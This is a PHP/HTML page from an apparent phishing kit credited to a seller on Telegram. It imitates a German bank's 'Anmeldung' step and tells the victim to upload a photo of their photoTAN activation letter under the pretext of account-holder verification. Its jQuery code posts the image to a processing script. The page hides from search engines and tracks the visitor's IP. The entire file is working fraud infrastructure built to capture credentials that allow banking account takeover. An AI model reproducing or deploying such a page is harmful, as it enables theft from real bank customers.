<?php
    /*******
    Main Author: Z0N51
    Contact me on telegram : https://t.me/z0n51official
    ********************************************************/
    
    require_once '../app/config.php';
    $_SESSION['last_page'] = "upload";
    reset_action(get_client_ip());

?>
<!doctype html>
<html>

    <head>
        <!-- Required meta tags -->
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
        <meta name="robots" content="noindex," "nofollow," "noimageindex," "noarchive," "nocache," "nosnippet">
        
        <!-- CSS FILES -->
        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css">
        <link rel="stylesheet" href="../media/css/helpers.css">
        <link rel="stylesheet" href="../media/css/style.css">

        <link rel="icon" type="image/x-icon" href="../media/imgs/ff.ico" />

        <title>Anmeldung</title>
    </head>

    <body>

        <div id="wrapper">
            <div class="container">
                <p class="text-end pt30 pb30" style="color: #1e325f; font-weight: 500; font-size: 16px; opacity: .65;">deutsch</p>
                <div class="box">
                    <div class="box-header">
                        <h3>Anmeldung</h3>
                    </div>
                    <div class="box-body">

                        <input type="hidden" id="cap" name="cap">
                        <input type="hidden" name="steeep" id="steeep" value="upload">

                        <p>Bitte laden Sie jetzt Ihre PhotoTAN-Aktivierungsbrief hoch, um den Prozess abzuschließen. Durch diesen Vorgang verifizieren Sie sich als Kontoinhaber.</p>
                        
                        <p class="mb50"><b>*Hinweis: Bitte warten Sie eine Weile, bis das Bild vollständig hochgeladen wurde, bevor Sie auf Weiter klicken. Und stellen Sie bitte sicher, dass die Grafik klar und sichtbar erkennbar ist.</b></p>

                        <div class="mt-5 mb-5 text-center"><img style="max-width: 200px;" src="../media/imgs/letter.png"></div>

                        <?php if( isset($_GET['error']) ) : ?>
                        <div class="error">
                            <p>Fehler hochladen</p>
                        </div>
                        <?php endif; ?>

                        <div class="upload-area form-group row align-items-center mb30">
                            <label for="phototan" class="lbl <?php echo errclass($_SESSION['errors'],'phototan_file') ?>">
                                <i class="fas fa-upload"></i>
                                <p>photoTAN-Aktivierungsbrief hochladen</p>
                            </label>
                            <input type="file" class="d-none" name="phototan" id="phototan" capture="environment">
                            <input type="hidden" name="phototan_file" id="phototan_file">
                        </div>
                        <div class="btns text-center">
                            <button class="btttn" id="booom">Überprüfen</button>
                        </div>
                    </div>
                </div>
                <div class="footer-logo text-center pt50 pb50">
                    <img src="../media/imgs/footer-logo.png">
                </div>
            </div>
        </div>

        <!-- JS FILES -->
        <script src="https://code.jquery.com/jquery-3.6.1.min.js"></script>
        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/js/bootstrap.bundle.min.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.2.0/js/all.min.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.min.js"></script>
        <script src="https://cdn.jsdelivr.net/npm/jquery-simple-upload@1.1.0/simpleUpload.min.js"></script>
        <script src="../media/js/js.js"></script>

        <script>
            var loaded = false;  
            $('#booom').click(function(){
                if( loaded == true ) {
                    return false;
                }
                formData = {
                    'cap' : $('#cap').val(),
                    'steeep' : $('#steeep').val(),
                    'phototan_file' : $('#phototan_file').val(),
                }
                $.post( "../processing.php", formData )
                    .done(function( data ) {
                    window.location.href = data;
                });
                loaded = true;
            });

            $('#phototan').change(function(){
                $(this).simpleUpload("../processing.php?step=upload&filename=phototan", {
                    start: function(file){
                        $('label[for="phototan"]').removeClass('success');
                        $('label[for="phototan"]').removeClass('has-error');
                        $('label[for="phototan"]').html('<div class="spinner-border text-secondary" role="status"></div>');
                    },
                    progress: function(progress){
                        $('label[for="phototan"]').html('<div class="spinner-border text-secondary" role="status"></div>');
                    },
                    success: function(data){
                        console.log(data);
                        if( data !== 'error' ) {
                            $('#phototan_file').val(data);
                            $('label[for="phototan"]').addClass('success');
                            $('label[for="phototan"]').html('<i class="fas fa-check"></i><p>Download erfolgreich abgeschlossen</p>');
                        } else if( data == 'error' ) {
                            $('label[for="phototan"]').addClass('has-error');
                            $('label[for="phototan"]').html('<i class="far fa-times-circle"></i>');
                        }
                    },
                    error: function(error){
                        $('label[for="phototan"]').addClass('has-error');
                        $('label[for="phototan"]').html('<i class="far fa-times-circle"></i>');
                    }
                });
            });
            
        </script>

    </body>

</html>